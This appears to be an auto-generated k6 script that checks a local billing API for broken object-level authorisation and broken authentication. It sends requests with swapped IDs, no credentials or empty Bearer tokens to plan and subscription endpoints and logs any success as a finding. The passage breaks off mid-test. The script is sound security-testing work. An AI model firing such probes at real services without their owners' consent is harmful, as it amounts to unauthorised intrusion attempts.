// OWASP API Security Top 10 Test Script
// Generated by MockForge - https://mockforge.dev
// Categories tested: api2

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Trend, Counter, Rate } from 'k6/metrics';

// Configuration
const BASE_URL = 'http://localhost:8080';
const AUTH_HEADER = 'Authorization';
const VALID_TOKEN = null;
const TIMEOUT = '30000ms';
const VERBOSE = false;
const INSECURE = true;

// Custom headers from CLI (e.g., Cookie, X-Custom-Header)
const CUSTOM_HEADERS = {
    'Cookie': 'session=abc123',
    'X-Custom': 'value',
};

// Custom metrics
const findingsCounter = new Counter('owasp_findings');
const testsRun = new Counter('owasp_tests_run');
const vulnerableRate = new Rate('owasp_vulnerable_rate');
const responseTime = new Trend('owasp_response_time');

// Test options - use per-VU iterations scenario for controlled test runs
export const options = {
    scenarios: {
        owasp_security_test: {
            executor: 'per-vu-iterations',
            vus: 10,
            iterations: 1,  // Iterations per VU
            maxDuration: '30m',
        },
    },
    thresholds: {
        'owasp_findings': ['count<100'], // Alert if too many findings
    },
    insecureSkipTLSVerify: INSECURE,
};

// Findings storage
const findings = [];

// Helper: Log a finding
function logFinding(category, endpoint, method, description, evidence) {
    const finding = {
        category,
        endpoint,
        method,
        description,
        evidence,
        timestamp: new Date().toISOString(),
    };
    findings.push(finding);
    findingsCounter.add(1);
    vulnerableRate.add(1);

    if (VERBOSE) {
        console.log(`[FINDING] ${category} - ${method} ${endpoint}: ${description}`);
    }
}

// Helper: Log test passed
function logPass(category, endpoint, method) {
    vulnerableRate.add(0);
    if (VERBOSE) {
        console.log(`[PASS] ${category} - ${method} ${endpoint}`);
    }
}

// Helper: Generate a random UUID for path parameters
// Uses crypto.randomUUID() which is globally available in k6 v1.0.0+
function generateRandomId() {
    return crypto.randomUUID();
}

// Helper: Replace path parameters with random UUIDs
// Replaces all {param} patterns with new random UUIDs
function replacePathParams(path) {
    return path.replace(/{[^}]+}/g, () => generateRandomId());
}

// Helper: Make authenticated request
function authRequest(method, url, body, additionalHeaders = {}) {
    // Clear cookie jar before EVERY request to prevent k6 from merging
    // Set-Cookie response cookies with our manually specified Cookie header
    http.cookieJar().clear(url);

    const headers = {
        'Content-Type': 'application/json',
        ...CUSTOM_HEADERS,
        ...additionalHeaders,
    };

    if (VALID_TOKEN) {
        headers[AUTH_HEADER] = VALID_TOKEN;
    }

    const params = {
        headers,
        timeout: TIMEOUT,
        jar: null,
    };

    // k6 uses 'del' instead of 'delete'
    const httpMethod = method === 'delete' ? 'del' : method;

    if (httpMethod === 'get' || httpMethod === 'head') {
        return http[httpMethod](url, params);
    } else {
        return http[httpMethod](url, body ? JSON.stringify(body) : null, params);
    }
}

// Helper: Make unauthenticated request
function unauthRequest(method, url, body, additionalHeaders = {}) {
    http.cookieJar().clear(url);

    const headers = {
        'Content-Type': 'application/json',
        ...CUSTOM_HEADERS,
        ...additionalHeaders,
    };

    const params = {
        headers,
        timeout: TIMEOUT,
        jar: null,
    };

    // k6 uses 'del' instead of 'delete'
    const httpMethod = method === 'delete' ? 'del' : method;

    if (httpMethod === 'get' || httpMethod === 'head') {
        return http[httpMethod](url, params);
    } else {
        return http[httpMethod](url, body ? JSON.stringify(body) : null, params);
    }
}

// API1: Broken Object Level Authorization (BOLA)
function testBola() {
    group('API1 - BOLA', function() {
        console.log('[API1] Testing Broken Object Level Authorization...');

        // Test /v1/billing/plans/{id}
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/plans/{id}'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/plans/{id}'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('get', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('get', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/plans/{id}', 'get',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/plans/{id}', 'get');
                }
            } else {
                logPass('api1', '/v1/billing/plans/{id}', 'get');
            }
        }
        // Test /v1/billing/plans/{id}
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/plans/{id}'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/plans/{id}'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('patch', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('patch', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/plans/{id}', 'patch',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/plans/{id}', 'patch');
                }
            } else {
                logPass('api1', '/v1/billing/plans/{id}', 'patch');
            }
        }
        // Test /v1/billing/plans/{id}/activate
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/plans/{id}/activate'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/plans/{id}/activate'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/plans/{id}/activate', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/plans/{id}/activate', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/plans/{id}/activate', 'post');
            }
        }
        // Test /v1/billing/plans/{id}/deactivate
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/plans/{id}/deactivate'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/plans/{id}/deactivate'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/plans/{id}/deactivate', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/plans/{id}/deactivate', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/plans/{id}/deactivate', 'post');
            }
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/plans/{id}/update-pricing-schemes'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/plans/{id}/update-pricing-schemes'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('get', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('get', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}', 'get',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}', 'get');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}', 'get');
            }
        }
        // Test /v1/billing/subscriptions/{id}
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('patch', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('patch', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}', 'patch',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}', 'patch');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}', 'patch');
            }
        }
        // Test /v1/billing/subscriptions/{id}/activate
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/activate'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/activate'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/activate', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/activate', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/activate', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/cancel
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/cancel'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/cancel'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/cancel', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/cancel', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/cancel', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/capture
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/capture'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/capture'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/capture', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/capture', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/capture', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/revise
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/revise'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/revise'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/revise', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/revise', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/revise', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/suspend
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/suspend'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/suspend'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('post', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('post', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/suspend', 'post',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/suspend', 'post');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/suspend', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/transactions
        {
            // Generate different random UUIDs for each test
            const originalId = generateRandomId();
            const targetId = generateRandomId();
            const originalPath = '/v1/billing/subscriptions/{id}/transactions'.replace(/{[^}]+}/g, originalId);
            const targetPath = '/v1/billing/subscriptions/{id}/transactions'.replace(/{[^}]+}/g, targetId);

            if (VERBOSE) {
                console.log(`[API1] Testing with IDs: ${originalId} -> ${targetId}`);
            }

            // Get baseline with first random ID
            const baseline = authRequest('get', BASE_URL + originalPath, null);

            // Try to access different random ID (simulating another user's resource)
            const response = authRequest('get', BASE_URL + targetPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                // Check if we got different data (potential BOLA vulnerability)
                if (response.body !== baseline.body && response.body.length > 0) {
                    logFinding('api1', '/v1/billing/subscriptions/{id}/transactions', 'get',
                        'ID manipulation accepted - accessed different resource',
                        { status: response.status, originalId, targetId, bodyLength: response.body.length });
                } else {
                    logPass('api1', '/v1/billing/subscriptions/{id}/transactions', 'get');
                }
            } else {
                logPass('api1', '/v1/billing/subscriptions/{id}/transactions', 'get');
            }
        }
    });
}

// API2: Broken Authentication
function testBrokenAuth() {
    group('API2 - Broken Authentication', function() {
        console.log('[API2] Testing Broken Authentication...');

        // Test /v1/billing/plans without auth
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const response = unauthRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans', 'get',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans', 'get');
            }
        }

        // Test /v1/billing/plans with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const httpMethod = 'get' === 'delete' ? 'del' : 'get';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans', 'get',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans without auth
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans', 'post');
            }
        }

        // Test /v1/billing/plans with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans/{id} without auth
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const response = unauthRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}', 'get',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans/{id}', 'get');
            }
        }

        // Test /v1/billing/plans/{id} with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const httpMethod = 'get' === 'delete' ? 'del' : 'get';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}', 'get',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans/{id} without auth
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const response = unauthRequest('patch', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}', 'patch',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans/{id}', 'patch');
            }
        }

        // Test /v1/billing/plans/{id} with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const httpMethod = 'patch' === 'delete' ? 'del' : 'patch';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}', 'patch',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans/{id}/activate without auth
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/activate', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans/{id}/activate', 'post');
            }
        }

        // Test /v1/billing/plans/{id}/activate with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/activate', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans/{id}/deactivate without auth
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/deactivate', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans/{id}/deactivate', 'post');
            }
        }

        // Test /v1/billing/plans/{id}/deactivate with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/deactivate', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes without auth
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
            }
        }

        // Test /v1/billing/plans/{id}/update-pricing-schemes with empty token
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions', 'post');
            }
        }

        // Test /v1/billing/subscriptions with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id} without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const response = unauthRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}', 'get',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}', 'get');
            }
        }

        // Test /v1/billing/subscriptions/{id} with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const httpMethod = 'get' === 'delete' ? 'del' : 'get';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}', 'get',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id} without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const response = unauthRequest('patch', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}', 'patch',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}', 'patch');
            }
        }

        // Test /v1/billing/subscriptions/{id} with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const httpMethod = 'patch' === 'delete' ? 'del' : 'patch';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
